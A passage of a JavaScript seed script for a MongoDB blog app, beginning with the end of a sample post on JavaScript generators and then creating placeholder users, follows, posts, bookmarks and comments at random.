    title: "Advanced JavaScript: Generators and Custom Iterators",
    tags: ["js-generators", "iterators", "es6", "async-control-flow", "javascript-patterns"],
    content: `
<h2>Functions That Can Pause</h2>
<p>In standard JavaScript, once a function starts executing, it runs to completion. You cannot stop it midway and resume it later. <strong>Generator functions</strong> break this rule. They can be paused and resumed at will, retaining their context and variable bindings across pauses.</p>
<hr>
<h3>Syntax of a Generator</h3>
<p>A generator is defined using an asterisk (<code>function*</code>). To pause execution, you use the <code>yield</code> keyword.</p>
<pre><code>function* numberGenerator() {
  console.log("Start");
  yield 1; // Pause and return 1
  
  console.log("Resumed");
  yield 2; // Pause and return 2
  
  console.log("End");
  return 3;
}

const gen = numberGenerator(); // Does NOT execute the code yet

console.log(gen.next().value); 
// Output: "Start", then 1
console.log(gen.next().value); 
// Output: "Resumed", then 2
console.log(gen.next().value); 
// Output: "End", then 3</code></pre>
<blockquote>
  "Generators do not run when called. Instead, they return a special Iterator object. You must explicitly call <code>.next()</code> to push the execution forward to the next <code>yield</code>."
</blockquote>
<h3>Real-World Use Case: Infinite Data Streams</h3>
<p>Because generators only compute the next value when requested (lazy evaluation), they are perfect for representing infinite sequences without crashing the browser's memory.</p>
<pre><code>function* fibonacciSequence() {
  let [prev, curr] = [0, 1];
  
  while (true) { // Infinite loop!
    yield curr;
    [prev, curr] = [curr, prev + curr];
  }
}

const fib = fibonacciSequence();

console.log(fib.next().value); // 1
console.log(fib.next().value); // 1
console.log(fib.next().value); // 2
console.log(fib.next().value); // 3
console.log(fib.next().value); // 5
// You can keep calling this forever, generating values on demand.</code></pre>
<h3>Generators vs Promises</h3>
<p>Before Async/Await became the standard in ES8, developers used Generators combined with Promises to write synchronous-looking asynchronous code (a library called <code>co</code> did exactly this). In fact, <s>Async/Await is just syntactic sugar over Generators and Promises</s>. Understanding generators gives you a deep appreciation for how modern JavaScript control flow operates under the hood.</p>
<p>Read more about the Iterator protocol on the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Iterators_and_Generators">MDN JavaScript Guide</a>.</p>
    `
  }
];
// ─── Users ───────────────────────────────────────────────────────────────────
const userData = [
  { name: "Shahid Khan",     username: "shahid",      email: "shahid@example.com",   bio: "MERN Stack developer. Built Blogiary as a personal project." },
  { name: "Aarav Patel",     username: "aaravpatel",  email: "aarav@example.com",    bio: "Full-stack developer passionate about open source." },
  { name: "Sophia Chen",     username: "sophiachen",  email: "sophia@example.com",   bio: "React enthusiast and UI/UX designer." },
  { name: "Liam Johnson",    username: "liamjohnson", email: "liam@example.com",     bio: "Backend wizard. Node.js and MongoDB lover." },
  { name: "Priya Sharma",    username: "priyasharma", email: "priya@example.com",    bio: "Learning AI and Machine Learning every day." },
  { name: "Ethan Williams",  username: "ethanwill",   email: "ethan@example.com",    bio: "Competitive programmer and DSA expert." },
  { name: "Mia Kim",         username: "miakim",      email: "mia@example.com",      bio: "Frontend developer. CSS artist." },
  { name: "Noah Davis",      username: "noahdavis",   email: "noah@example.com",     bio: "Software Engineer at a tech startup." },
  { name: "Isabella Garcia", username: "isabellag",   email: "isabella@example.com", bio: null }, // no bio, no image
  { name: "Lucas Martinez",  username: "lucasmtz",    email: "lucas@example.com",    bio: null }, // no bio, no image
];

// ─── Dynamic Post Distribution Logic ─────────────────────────────────────────
// Total posts = 50. Shahid (index 0) gets exactly 8.
const postsPerUser = Array(10).fill(0);
postsPerUser[0] = 8;

// Distribute the remaining 42 posts randomly among the other 9 users (indexes 1-9)
let remainingPosts = 42;
while (remainingPosts > 0) {
  const randomUserIndex = Math.floor(Math.random() * 9) + 1; 
  postsPerUser[randomUserIndex]++;
  remainingPosts--;
}

const commentsPool = [
  "Great explanation! This really cleared things up for me.",
  "I struggled with this concept — this helped a lot.",
  "What's the time complexity for this approach?",
  "Thanks for sharing! Could you do a follow-up on advanced use cases?",
  "This is exactly what I was looking for.",
  "Awesome post! I'll definitely apply this in my next project.",
  "Well written and easy to understand.",
  "Interesting approach. I usually do it differently, but this is neat.",
  "Can you share the GitHub repo for this?",
  "Nice article! Bookmarked for future reference.",
  "I never thought about it this way. Mind blown.",
  "This should be pinned. Really useful for beginners.",
  "The code examples make it so much clearer.",
  "Followed! Looking forward to more posts like this.",
];

const randomDate = (start, end) =>
  new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));

const seedDatabase = async () => {
  try {
    await mongoose.connect(process.env.MONGO_URI);
    console.log("✅ MongoDB connected");

    // ── 1. Create users ──────────────────────────────────────────────────────
    const hashedPassword = await bcrypt.hash("1234", 10);
    const createdUsers = [];

    for (let i = 0; i < userData.length; i++) {
      const u = userData[i];
      // Only the first 8 users get profile pictures
      const hasImage = i < 8; 

      const user = new User({
        name: u.name,
        username: u.username,
        email: u.email,
        password: hashedPassword,
        ...(u.bio ? { bio: u.bio } : {}),
        ...(hasImage && userImageUrls[i] ? { profile_img: userImageUrls[i] } : {}),
      });
      await user.save();
      createdUsers.push(user);
      console.log(`👤 Created user: ${u.username} (Posts allocated: ${postsPerUser[i]})`);
    }

    // ── 2. Follow relationships ───────────────────────────────────────────────
    for (let i = 0; i < createdUsers.length; i++) {
      const numFollow = Math.floor(Math.random() * 3) + 3; // 3-5
      const others = createdUsers.filter((_, j) => j !== i);
      const toFollow = others.sort(() => 0.5 - Math.random()).slice(0, numFollow);
      for (const f of toFollow) {
        await User.findByIdAndUpdate(createdUsers[i]._id, { $addToSet: { following: f._id } });
        await User.findByIdAndUpdate(f._id, { $addToSet: { followers: createdUsers[i]._id } });
      }
    }
    console.log("✅ Follow relationships created");

    // ── 3. Create posts ───────────────────────────────────────────────────────
    const startDate = new Date("2026-02-01T00:00:00Z");
    const endDate   = new Date("2026-05-25T15:00:00Z");

    const postDataList = [];
    let postIndex = 0;

    for (let i = 0; i < createdUsers.length; i++) {
      for (let j = 0; j < postsPerUser[i]; j++) {
        // Safe check in case posts array has less than 50 (though it should have exactly 50)
        const p = posts[postIndex % posts.length]; 
        
        // Random likes between 2 and 8
        const numLikes = Math.floor(Math.random() * 7) + 2;
        const shuffledUsers = [...createdUsers].sort(() => 0.5 - Math.random());
        const likes = shuffledUsers.slice(0, numLikes).map(u => u._id);

        postDataList.push({
          title: p.title,
          content: p.content.trim(),
          tags: p.tags.filter(tag => tag.length <= 20).slice(0, 5),
          author: createdUsers[i]._id,
          likes,
          views: Math.floor(Math.random() * 800) + 50, // Random views logic
          createdAt: randomDate(startDate, endDate),
        });
        postIndex++;
      }
    }

    // Sort newest first so top 24 get unique images
    postDataList.sort((a, b) => b.createdAt - a.createdAt);

    // Assign images
    const shuffledImages = [...postImageUrls].sort(() => 0.5 - Math.random());
    for (let i = 0; i < postDataList.length; i++) {
      if (i < 24 && shuffledImages[i]) {
        postDataList[i].img = shuffledImages[i];
      } else if (i >= 24 && postImageUrls.length > 0) {
        postDataList[i].img = postImageUrls[Math.floor(Math.random() * postImageUrls.length)];
      }
    }

    const createdPosts = [];
    for (const pd of postDataList) {
      const post = new Post({ ...pd, updatedAt: pd.createdAt });
      await post.save();
      createdPosts.push(post);
    }
    console.log(`✅ Created ${createdPosts.length} posts`);

    // ── 4. Bookmarks ──────────────────────────────────────────────────────────
    const bookmarkUsers = [...createdUsers].sort(() => 0.5 - Math.random()).slice(0, 5);
    for (const u of bookmarkUsers) {
      const numBookmarks = Math.floor(Math.random() * 4) + 3;
      const bookmarked = [...createdPosts].sort(() => 0.5 - Math.random()).slice(0, numBookmarks);
      await User.findByIdAndUpdate(u._id, {
        $addToSet: { bookmarks: { $each: bookmarked.map(p => p._id) } }
      });
    }
    console.log("✅ Bookmarks added");

    // ── 5. Comments ───────────────────────────────────────────────────────────
    let totalComments = 0;
    for (const post of createdPosts) {
      // Random comments between 3 and 8
      const numComments = Math.floor(Math.random() * 6) + 3; 
      const commenters = [...createdUsers].sort(() => 0.5 - Math.random()).slice(0, numComments);
      
      for (const commenter of commenters) {
        const text = commentsPool[Math.floor(Math.random() * commentsPool.length)];
        const commentDate = randomDate(new Date(post.createdAt), endDate);
        const comment = new Comment({
          content: text,
          author: commenter._id,
          post: post._id,
          createdAt: commentDate,
          updatedAt: commentDate,
        });
        await comment.save();
        totalComments++;
      }
    }

    console.log("\n🎉 Seed completed!");
    console.log(`👤 Users:    ${createdUsers.length}`);
    console.log(`📝 Posts:    ${createdPosts.length}`);
    console.log(`💬 Comments: ${totalComments}`);

    await mongoose.disconnect();
    console.log("✅ MongoDB disconnected");
  } catch (error) {
    console.error("❌ Seed error:", error);
    await mongoose.disconnect();
    process.exit(1);
  }
};

seedDatabase();